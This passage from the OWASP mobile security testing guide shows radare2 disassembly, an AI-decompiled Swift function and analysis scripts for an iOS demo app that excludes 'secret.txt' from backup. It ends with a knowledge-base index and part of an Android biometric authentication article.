MASTestApp.MastgTest.mastg.completion...FZ @ 0x1000048e4(x), 0x10000494c(x)\n\u2502   \u250c\u2500\u250c\u2500\u2500\u2500&gt; 0x1000046ec      sub x8, x29, 0x150\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000046f0      ldur x0, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000046f4      sub x8, x29, 0x100\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000046f8      stur x0, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000046fc      bl sym.imp.swift_errorRetain\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004700      sub x8, x29, 0x100\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004704      ldur x8, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004708      sub x9, x29, 0x30\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000470c      ldur x0, [x9, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004710      stur x8, [x29, -0x90]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004714      bl sym.imp.swift_retain\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004718      mov w8, 0x15\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000471c      mov x0, x8\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004720      sub x8, x29, 0x148\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004724      stur x0, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004728      mov w8, 1\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000472c      mov x1, x8\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004730      bl sym DefaultStringInterpolation.literalCapacity.interpolationCount...itcfC ; sym.imp.DefaultStringInterpolation.literalCapacity.interpolationCount...itcfC\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004734      mov x8, x1\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004738      sub x9, x29, 0x148\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000473c      ldur x1, [x9, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004740      sub x20, x29, 0xa0\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004744      sub x9, x29, 0x120\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004748      stur x20, [x9, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000474c      stur x0, [x29, -0xa0]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004750      stur x8, [x29, -0x98]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004754      adrp x0, sym.imp.swift_getObjCClassMetadata ; 0x10000d000\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004758      add x0, x0, 0xc30                         ; 0x10000dc30 ; \"Error creating file: \"\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000475c      mov w8, 1\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004760      sub x9, x29, 0x12c\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004764      stur w8, [x9, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004768      and w2, w8, 1\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000476c      bl sym _builtinStringLiteral.utf8CodeUnitCount.isASCII__String: Builtin.Word, B...cfC ; sym.imp._builtinStringLiteral.utf8CodeUnitCount.isASCII__String:_Builtin.Word__B...cfC\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004770      sub x8, x29, 0x140\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004774      stur x1, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004778      bl sym DefaultStringInterpolation.appendLiteral...SSF ; sym.imp.DefaultStringInterpolation.appendLiteral...SSF\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000477c      sub x8, x29, 0x120\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004780      ldur x20, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004784      sub x8, x29, 0x140\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004788      ldur x0, [x8, -0x100]                     ; void *arg0\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000478c      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004790      sub x8, x29, 0x100\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004794      ldur x8, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004798      sub x9, x29, 0xa8\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000479c      sub x10, x29, 0x138\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047a0      stur x9, [x10, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047a4      stur x8, [x29, -0xa8]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047a8      adrp x0, sym.__METACLASS_DATA__TtC10MASTestAppP33_9471609302C95FC8EC1D59DD4CF2A2DB19ResourceBundleClass ; 0x100014000\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047ac      add x0, x0, 0x100                         ; 0x100014100 ; \"z\\x90\\xff\\xff\\xf9\" ; int64_t arg1\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047b0      bl sym.___swift_instantiateConcreteTypeFromMangledName\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047b4      mov x1, x0\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047b8      sub x8, x29, 0x138\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047bc      ldur x0, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047c0      bl sym DefaultStringInterpolation.append...C0yyxlF...xlF ; sym.imp.DefaultStringInterpolation.append...C0yyxlF...xlF\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047c4      sub x8, x29, 0x120\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047c8      ldur x20, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047cc      sub x8, x29, 0x12c\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047d0      ldur w8, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047d4      adrp x0, sym.imp.swift_getObjCClassMetadata ; 0x10000d000\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047d8      add x0, x0, 0xbf8\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047dc      mov x1, 0\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047e0      and w2, w8, 1\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047e4      bl sym _builtinStringLiteral.utf8CodeUnitCount.isASCII__String: Builtin.Word, B...cfC ; sym.imp._builtinStringLiteral.utf8CodeUnitCount.isASCII__String:_Builtin.Word__B...cfC\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047e8      sub x8, x29, 0x128\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047ec      stur x1, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047f0      bl sym DefaultStringInterpolation.appendLiteral...SSF ; sym.imp.DefaultStringInterpolation.appendLiteral...SSF\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047f4      sub x8, x29, 0x30\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047f8      ldur x20, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x1000047fc      sub x8, x29, 0x128\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004800      ldur x0, [x8, -0x100]                     ; void *arg0\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004804      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004808      ldur x8, [x29, -0xa0]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000480c      sub x9, x29, 0x110\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004810      stur x8, [x9, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004814      ldur x0, [x29, -0x98]                     ; void *arg0\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004818      sub x8, x29, 0x118\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000481c      stur x0, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004820      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004824      sub x8, x29, 0x120\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004828      ldur x0, [x8, -0x100]                     ; void *arg0\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000482c      bl sym ...ss26DefaultStringInterpolationVWOh ; sym....ss26DefaultStringInterpolationVWOh\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004830      sub x8, x29, 0x118\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004834      ldur x1, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004838      sub x8, x29, 0x110\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000483c      ldur x0, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004840      bl sym stringInterpolation__String...cfC  ; sym.imp.stringInterpolation__String...cfC\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004844      sub x8, x29, 0x28\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004848      ldur x8, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000484c      sub x9, x29, 0x108\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004850      stur x1, [x9, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004854      blr x8\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004858      sub x8, x29, 0x108\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000485c      ldur x0, [x8, -0x100]                     ; void *arg0\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004860      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004864      sub x8, x29, 0x30\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004868      ldur x0, [x8, -0x100]                     ; void *arg0\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000486c      bl sym.imp.swift_release                  ; void swift_release(void *arg0)\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004870      sub x8, x29, 0x100\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004874      ldur x0, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004878      bl sym.imp.swift_errorRelease\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x10000487c      sub x8, x29, 0x100\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004880      ldur x0, [x8, -0x100]\n\u2502   \u254e\u254e\u254e\u2502\u2502   0x100004884      bl sym.imp.swift_errorRelease\n\u2502   \u254e\u2514\u2500\u2500\u2500\u2500&lt; 0x100004888      b 0x100004634\n\u2502   \u254e \u254e\u2502\u2502   ; CODE XREF from MASTestApp.MastgTest.mastg.completion...FZ @ 0x100004538(x)\n\u2502   \u254e \u254e\u2502\u2514\u2500&gt; 0x10000488c      sub x8, x29, 0x60\n\u2502   \u254e \u254e\u2502    0x100004890      ldur x1, [x8, -0x100]\n\u2502   \u254e \u254e\u2502    0x100004894      sub x8, x29, 0x48\n\u2502   \u254e \u254e\u2502    0x100004898      ldur x0, [x8, -0x100]\n\u2502   \u254e \u254e\u2502    0x10000489c      sub x8, x29, 0x58\n\u2502   \u254e \u254e\u2502    0x1000048a0      ldur x8, [x8, -0x100]\n\u2502   \u254e \u254e\u2502    0x1000048a4      sub x9, x29, 0xb8\n\u2502   \u254e \u254e\u2502    0x1000048a8      ldur x9, [x9, -0x100]\n\u2502   \u254e \u254e\u2502    0x1000048ac      sub x10, x29, 0x158\n\u2502   \u254e \u254e\u2502    0x1000048b0      stur x9, [x10, -0x100]\n\u2502   \u254e \u254e\u2502    0x1000048b4      ldr x8, [x8, 8]\n\u2502   \u254e \u254e\u2502    0x1000048b8      blr x8\n\u2502   \u254e \u254e\u2502    0x1000048bc      ldur x8, [x29, -0xc0]\n\u2502   \u254e \u254e\u2502    0x1000048c0      sub x9, x29, 0x18\n\u2502   \u254e \u254e\u2502    0x1000048c4      ldur x0, [x9, -0x100]\n\u2502   \u254e \u254e\u2502    0x1000048c8      ldur x1, [x29, -0xb0]\n\u2502   \u254e \u254e\u2502    0x1000048cc      ldr x8, [x8, 8]\n\u2502   \u254e \u254e\u2502    0x1000048d0      blr x8\n\u2502   \u254e \u254e\u2502    0x1000048d4      sub x8, x29, 0x158\n\u2502   \u254e \u254e\u2502    0x1000048d8      ldur x8, [x8, -0x100]\n\u2502   \u254e \u254e\u2502    0x1000048dc      sub x9, x29, 0x150\n\u2502   \u254e \u254e\u2502    0x1000048e0      stur x8, [x9, -0x100]\n\u2502   \u2514\u2500\u2500\u2500\u2500\u2500&lt; 0x1000048e4      b 0x1000046ec\n\u2502     \u254e\u2502    ; CODE XREF from MASTestApp.MastgTest.mastg.completion...FZ @ 0x1000045e4(x)\n\u2502     \u254e\u2514\u2500\u2500&gt; 0x1000048e8      sub x8, x29, 0x90\n\u2502     \u254e     0x1000048ec      ldur x1, [x8, -0x100]\n\u2502     \u254e     0x1000048f0      sub x8, x29, 0x78\n\u2502     \u254e     0x1000048f4      ldur x0, [x8, -0x100]\n\u2502     \u254e     0x1000048f8      sub x8, x29, 0x88\n\u2502     \u254e     0x1000048fc      ldur x8, [x8, -0x100]\n\u2502     \u254e     0x100004900      sub x9, x29, 0xe0\n\u2502     \u254e     0x100004904      ldur x9, [x9, -0x100]\n\u2502     \u254e     0x100004908      sub x10, x29, 0x160\n\u2502     \u254e     0x10000490c      stur x9, [x10, -0x100]\n\u2502     \u254e     0x100004910      ldr x8, [x8, 8]\n\u2502     \u254e     0x100004914      sub x9, x29, 0x168\n\u2502     \u254e     0x100004918      stur x8, [x9, -0x100]\n\u2502     \u254e     0x10000491c      blr x8\n\u2502     \u254e     0x100004920      sub x8, x29, 0x68\n\u2502     \u254e     0x100004924      ldur x0, [x8, -0x100]\n\u2502     \u254e     0x100004928      sub x8, x29, 0x90\n\u2502     \u254e     0x10000492c      ldur x1, [x8, -0x100]\n\u2502     \u254e     0x100004930      sub x8, x29, 0x168\n\u2502     \u254e     0x100004934      ldur x8, [x8, -0x100]\n\u2502     \u254e     0x100004938      blr x8\n\u2502     \u254e     0x10000493c      sub x8, x29, 0x160\n\u2502     \u254e     0x100004940      ldur x8, [x8, -0x100]\n\u2502     \u254e     0x100004944      sub x9, x29, 0x150\n\u2502     \u254e     0x100004948      stur x8, [x9, -0x100]\n\u2514     \u2514\u2500\u2500\u2500&lt; 0x10000494c      b 0x1000046ec\n</code></pre> <pre><code>// \u2728 Decompiled using OpenAI's ChatGPT o1-review model \u2728\n\nfunc completion() {\n    // Step 1: Retrieve the documents directory URL\n    if let documentsPath = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first {\n        // Step 2: Create a file URL for \"secret.txt\" in the documents directory\n        let fileURL = documentsPath.appendingPathComponent(\"secret.txt\")\n        // Step 3: Define the content to write to the file\n        let content = \"MAS_API_KEY=8767086b9f6f976g-a8df76\"\n\n        do {\n            // Step 4: Write the content to the file\n            try content.write(to: fileURL, atomically: true, encoding: .utf8)\n            // Step 5: Set the 'isExcludedFromBackup' attribute to true\n            var resourceValues = URLResourceValues()\n            resourceValues.isExcludedFromBackup = true\n            try fileURL.setResourceValues(resourceValues)\n            // Step 6: Log a success message\n            print(\"File created and isExcludedFromBackup flag set to true\")\n        } catch {\n            // Step 7: Log an error message if an exception occurs\n            print(\"Error creating file: \\(error)\")\n        }\n    }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0215"]},{"location":"MASTG/demos/ios/MASVS-STORAGE/MASTG-DEMO-0019/MASTG-DEMO-0019/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Run <code>run.sh</code>.</li> </ol> isExcludedFromBackup.r2<pre><code>e asm.bytes=false\ne scr.color=false\ne asm.var=false\n\n?e Uses of isExcludedFromBackup:\nafl~isExcludedFromBackup\n\n?e\n\n?e xrefs to isExcludedFromBackup:\naxt @ 0x10000cc28\n\n?e\n?e Use of isExcludedFromBackup:\n\npd-- 5 @ 0x100004594\n\n?e\n?e Search for secret.txt:\n/ secret.txt\n\n?e\n?e Use of the string secret.txt:\npd-- 5 @ 0x10000443c\n\npdf @ 0x100004594 &gt; function.asm\n</code></pre> run.sh<pre><code>#!/bin/bash\nr2 -q -i isExcludedFromBackup.r2 -A MASTestApp &gt; output.asm\n</code></pre>","tags":["ios","demo","MASTG-TEST-0215"]},{"location":"MASTG/demos/ios/MASVS-STORAGE/MASTG-DEMO-0019/MASTG-DEMO-0019/#observation","title":"Observation","text":"<p>The output reveals the use of <code>isExcludedFromBackupKey</code> in the app.</p> output.asm<pre><code>Uses of isExcludedFromBackup:\n0x10000cc28    1     12 sym.imp.Foundation.URLResourceValues.isExcludedFromBackup...Sgvs\n\nxrefs to isExcludedFromBackup:\nsym.MASTestApp.MastgTest.mastg.completion...FZ 0x100004594 [CALL:--x] bl sym.imp.Foundation.URLResourceValues.isExcludedFromBackup...Sgvs\n\nUse of isExcludedFromBackup:\n\u2502           0x100004580      ldr x8, [x8, 8]\n\u2502           0x100004584      blr x8\n\u2502           0x100004588      mov x8, x20\n\u2502           0x10000458c      bl sym.imp.Foundation.URLResourceValues...VACycfC...ycfC\n\u2502           0x100004590      mov w0, 1\n\u2502           0x100004594      bl sym Foundation.URLResourceValues.isExcludedFromBackup...Sgvs ; sym.imp.Foundation.URLResourceValues.isExcludedFromBackup...Sgvs\n\u2502           0x100004598      sub x8, x29, 8\n\u2502           0x10000459c      ldur x20, [x8, -0x100]\n\u2502           0x1000045a0      sub x8, x29, 0x88\n\u2502           0x1000045a4      ldur x8, [x8, -0x100]\n\nSearch for secret.txt:\n0x10000dbe6 hit4_0 \"lueFatal errorsecret.txt\"\n\nUse of the string secret.txt:\n\u2502           0x100004428      mov x0, x20\n\u2502           0x10000442c      blr x8\n\u2502           0x100004430      ldur x0, [x29, -0xe8]                     ; void *instance\n\u2502           0x100004434      bl sym.imp.objc_release                   ; void objc_release(void *instance)\n\u2502           0x100004438      adrp x0, sym.imp.swift_getObjCClassMetadata ; 0x10000d000\n\u2502           0x10000443c      add x0, x0, 0xbe6                         ; 0x10000dbe6 ; \"secret.txt\"\n\u2502           0x100004440      mov w8, 0xa\n\u2502           0x100004444      mov x1, x8\n\u2502           0x100004448      mov w8, 1\n\u2502           0x10000444c      sub x9, x29, 0xc4\n</code></pre>","tags":["ios","demo","MASTG-TEST-0215"]},{"location":"MASTG/demos/ios/MASVS-STORAGE/MASTG-DEMO-0019/MASTG-DEMO-0019/#evaluation","title":"Evaluation","text":"<p>The test fails because <code>secret.txt</code> might be restored from the backup and it contains sensitive data.</p> <p>You can see the call to <code>isExcludedFromBackupKey</code> at <code>0x100004594</code> and the associated file, <code>secret.txt</code> at <code>0x10000443c</code>.</p> <p>Note: Using artificial intelligence we're able to decompile the disassembled code and review it. The output is a human-readable version of the assembly code. The AI decompiled code may not perfect and might contain errors but, in this case, it clearly shows the use of <code>isExcludedFromBackupKey</code> and the associated file <code>secret.txt</code>.</p>","tags":["ios","demo","MASTG-TEST-0215"]},{"location":"MASTG/knowledge/","title":"Mobile Application Security Knowledge Base","text":"<p>The Mobile Application Security Knowledge Base is a collection of knowledge articles that provide detailed information on various aspects of mobile application security. It includes general security concepts, platform-specific features and APIs, as well as detailed explanations and references.</p> <p>The knowledge base is designed to be a comprehensive resource for security professionals, developers, and testers who are looking to enhance their understanding of mobile application security. From cryptographic practices, data storage techniques, deep links, to network security, the knowledge base covers a wide range of topics relevant to mobile security.</p> <p>The articles are organized into categories, making it easy to navigate and find specific information. They are also linked to other MASTG components, such as tests, techniques or tools, providing a holistic view of mobile application security practices.</p> <p>The knowledge base is continuously updated to reflect the latest security trends, best practices, and platform updates. It serves as a valuable resource for anyone involved in mobile application security, whether you are a developer looking to implement secure coding practices, a tester conducting security assessments, or a security professional seeking to stay informed about the latest threats and mitigation strategies.</p> ID Name Platform MASTG-KNOW-0033  Obfuscation platform:android MASTG-KNOW-0035  Google Play Integrity API platform:android MASTG-KNOW-0030  Detection of Reverse Engineering Tools platform:android MASTG-KNOW-0034  Device Binding platform:android MASTG-KNOW-0032  Runtime Integrity Verification platform:android MASTG-KNOW-0029  File Integrity Checks platform:android MASTG-KNOW-0027  Root Detection platform:android MASTG-KNOW-0031  Emulator Detection platform:android MASTG-KNOW-0028  Anti-Debugging platform:android MASTG-KNOW-0026  Third-party Services Embedded in the App platform:android MASTG-KNOW-0003  App Signing platform:android MASTG-KNOW-0007  Debuggable Apps platform:android MASTG-KNOW-0004  Third-Party Libraries platform:android MASTG-KNOW-0009  StrictMode platform:android MASTG-KNOW-0005  Memory Corruption Bugs platform:android MASTG-KNOW-0008  Debugging Symbols platform:android MASTG-KNOW-0010  Exception Handling platform:android MASTG-KNOW-0006  Binary Protection Mechanisms platform:android MASTG-KNOW-0016  TBD platform:android MASTG-KNOW-0015  Certificate Pinning platform:android MASTG-KNOW-0014  Android Network Security Configuration platform:android MASTG-KNOW-0020  Inter-Process Communication (IPC) Mechanisms platform:android MASTG-KNOW-0019  Deep Links platform:android MASTG-KNOW-0021  Object Serialization platform:android MASTG-KNOW-0017  App Permissions platform:android MASTG-KNOW-0025  Implicit Intents platform:android MASTG-KNOW-0023  Enforced Updating platform:android MASTG-KNOW-0018  WebViews platform:android MASTG-KNOW-0024  Pending Intents platform:android MASTG-KNOW-0022  Overlay Attacks platform:android MASTG-KNOW-0051  Process Memory platform:android MASTG-KNOW-0049  Logs platform:android MASTG-KNOW-0053  Screenshots platform:android MASTG-KNOW-0039  Firebase Real-time Databases platform:android MASTG-KNOW-0055  Keyboard Cache platform:android MASTG-KNOW-0047  Cryptographic Key Storage platform:android MASTG-KNOW-0036  Shared Preferences platform:android MASTG-KNOW-0041  Internal Storage platform:android MASTG-KNOW-0046  BouncyCastle KeyStore platform:android MASTG-KNOW-0037  SQLite Database platform:android MASTG-KNOW-0044  Key Attestation platform:android MASTG-KNOW-0050  Backups platform:android MASTG-KNOW-0040  Realm Databases platform:android MASTG-KNOW-0045  Secure Key Import into Keystore platform:android MASTG-KNOW-0042  External Storage platform:android MASTG-KNOW-0048  KeyChain platform:android MASTG-KNOW-0043  Android KeyStore platform:android MASTG-KNOW-0038  SQLCipher Database platform:android MASTG-KNOW-0052  User Interface Components platform:android MASTG-KNOW-0054  App Notifications platform:android MASTG-KNOW-0002  FingerprintManager platform:android MASTG-KNOW-0001  Biometric Authentication platform:android MASTG-KNOW-0013  Random number generation platform:android MASTG-KNOW-0012  Key Generation platform:android MASTG-KNOW-0011  Security Provider platform:android MASTG-KNOW-0090  Device Binding platform:ios MASTG-KNOW-0084  Jailbreak Detection platform:ios MASTG-KNOW-0086  File Integrity Checks platform:ios MASTG-KNOW-0087  Reverse Engineering Tools Detection platform:ios MASTG-KNOW-0088  Emulator Detection platform:ios MASTG-KNOW-0089  Obfuscation platform:ios MASTG-KNOW-0085  Anti-Debugging Detection platform:ios MASTG-KNOW-0058  App Signing platform:ios MASTG-KNOW-0060  Memory Corruption Bugs platform:ios MASTG-KNOW-0059  Third-Party Libraries platform:ios MASTG-KNOW-0065  Exception Handling platform:ios MASTG-KNOW-0061  Binary Protection Mechanisms platform:ios MASTG-KNOW-0062  Debuggable Apps platform:ios MASTG-KNOW-0064  Debugging Code and Error Logging platform:ios MASTG-KNOW-0063  Debugging Symbols platform:ios MASTG-KNOW-0072  Server Trust Evaluation platform:ios MASTG-KNOW-0071  iOS App Transport Security platform:ios MASTG-KNOW-0073  iOS Network APIs platform:ios MASTG-KNOW-0080  Universal Links platform:ios MASTG-KNOW-0075  Object Serialization platform:ios MASTG-KNOW-0076  WebViews platform:ios MASTG-KNOW-0083  Pasteboard platform:ios MASTG-KNOW-0082  App extensions platform:ios MASTG-KNOW-0079  Custom URL Schemes platform:ios MASTG-KNOW-0081  UIActivity Sharing platform:ios MASTG-KNOW-0077  App Permissions platform:ios MASTG-KNOW-0078  Inter-Process Communication (IPC) platform:ios MASTG-KNOW-0074  Enforced Updating platform:ios MASTG-KNOW-0099  Screenshots platform:ios MASTG-KNOW-0103  Process Memory platform:ios MASTG-KNOW-0104  Inter-Process Communication (IPC) Mechanisms platform:ios MASTG-KNOW-0100  Keyboard Cache platform:ios MASTG-KNOW-0092  Binary Data Storage platform:ios MASTG-KNOW-0096  Realm Databases platform:ios MASTG-KNOW-0095  Firebase Real-time Databases platform:ios MASTG-KNOW-0101  Logs platform:ios MASTG-KNOW-0091  File System APIs platform:ios MASTG-KNOW-0098  User Interface Components platform:ios MASTG-KNOW-0094  CoreData platform:ios MASTG-KNOW-0093  UserDefaults platform:ios MASTG-KNOW-0097  Other Third-Party Databases platform:ios MASTG-KNOW-0102  Backups platform:ios MASTG-KNOW-0056  Local Authentication Framework platform:ios MASTG-KNOW-0057  Keychain Services platform:ios MASTG-KNOW-0067  CommonCrypto, SecKey and Wrapper libraries platform:ios MASTG-KNOW-0066  CryptoKit platform:ios MASTG-KNOW-0069  Key Management platform:ios MASTG-KNOW-0070  Random Number Generator platform:ios MASTG-KNOW-0068  Cryptographic Third-Party libraries platform:ios <p></p>","tags":[]},{"location":"MASTG/knowledge/android/MASVS-AUTH/MASTG-KNOW-0001/","title":"MASTG-KNOW-0001: Biometric Authentication","text":"<p>Biometric authentication is a convenient mechanism for authentication, but also introduces an additional attack surface when using it. The Android developer documentation gives an interesting overview and indicators for measuring biometric unlock security.</p> <p>The Android platform offers three different classes for biometric authentication:</p> <ul> <li>Android 10 (API level 29) and higher: <code>BiometricManager</code></li> <li>Android 9 (API level 28) and higher: <code>BiometricPrompt</code></li> <li>Android 6.0 (API level 23) and higher: <code>FingerprintManager</code> (deprecated in Android 9 (API level 28))</li> </ul> <p></p> <p>The class <code>BiometricManager</code> can be used to verify if biometric hardware is available on the device and if it's configured by the user. If that's the case, the class <code>BiometricPrompt</code> can be used to show a system-provided biometric dialog.</p> <p>The <code>BiometricPrompt</code> class is a significant improvement, as it allows to have a consistent UI for biometric authentication on Android and also supports more sensors than just fingerprint.</p> <p>A very detailed overview and explanation of the Biometric API on Android was published on the Android Developer Blog.</p> <p>Show a biometric authentication dialog</p>","tags":["android","MASVS-AUTH","know"]},{"location":"MASTG/knowledge/android/MASVS-AUTH/MASTG-KNOW-0001/#biometric-library","title":"Biometric Library","text":"<p>Android provides a library called Biometric (also see the androidx.biometric API Reference) which offers a compatibility version of the <code>BiometricPrompt</code> and <code>BiometricManager</code> APIs, as implemented in Android 10, with full feature support back to Android 6.0 (API 23).</p> <p>You can find a reference implementation and instructions on how to show a biometric authentication dialog in the Android developer documentation.</p> <p>There are two <code>authenticate</code> methods available in the <code>BiometricPrompt</code> class. One of them expects a <code>CryptoObject</code>, which adds an additional layer of security for the biometric authentication.</p> <p>The authentication flow would be as follows when using CryptoObject:</p> <ul> <li>The app creates a key in the KeyStore with <code>setUserAuthenticationRequired</code> and <code>setInvalidatedByBiometricEnrollment</code> set to true. Additionally, <code>setUserAuthenticationValidityDurationSeconds</code> should be set to -1.</li> <li>This key is used to encrypt information that is authenticating the user (e.g. session information or authentication token).</li> <li>A valid set of biometrics must be presented before the key is released from the KeyStore to decrypt the data, which is validated through the <code>authenticate</code> method and the <code>CryptoObject</code>.</li> <li>This solution cannot be bypassed, even on rooted devices, as the key from the KeyStore can only be used after successful biometric authentication.</li> </ul> <p>If <code>CryptoObject</code> is not used as part of the authenticate method, it can be bypassed by using Frida. See the \"Dynamic Instrumentation\" section for more details.</p> <p>Developers can use several validation classes offered by Android to test the implementation of biometric authentication in their app.</p>","tags":["android","MASVS-AUTH","know"]},{"location":"MASTG/knowledge/android/MASVS-AUTH/MASTG-KNOW-0001/#biometric-authentication-for-protecting-sensitive-data-or-operations","title":"Biometric Authentication for Protecting Sensitive Data or Operations","text":"<p>The confirm credential flow is available since Android 6.0 and is used to ensure that users do not have to enter app-specific passwords together with the lock screen protection. Instead: if a user has logged in to the device recently, then confirm-credentials can be used to unlock cryptographic materials from the <code>AndroidKeystore</code>. That is, if the user unlocked the device within the set time limits (<code>setUserAuthenticationValidityDurationSeconds</code>), otherwise the device needs to be unlocked again.</p> <p>Note that the security of Confirm Credentials is only as strong as the protection set at the lock screen. This often means that simple predictive lock-screen patterns are used and therefore we do not recommend any apps which require L2 of security controls to use Confirm Credentials.</p> <p>Reassure that the lock screen is set:</p> <pre><code>KeyguardManager mKeyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);\nif (!mKeyguardManager.isKeyguardSecure()) {\n    // Show a message that the user hasn't set up a lock screen.\n}\n</code></pre> <ul> <li> <p>Create the key protected by the lock screen. In order to use this key, the user needs to have unlocked the device in the last X seconds, or the device needs to be unlocked again. Make sure that this timeout is not too long, as it becomes harder to ensure that it was the same user using the app as the user unlocking the device:</p> 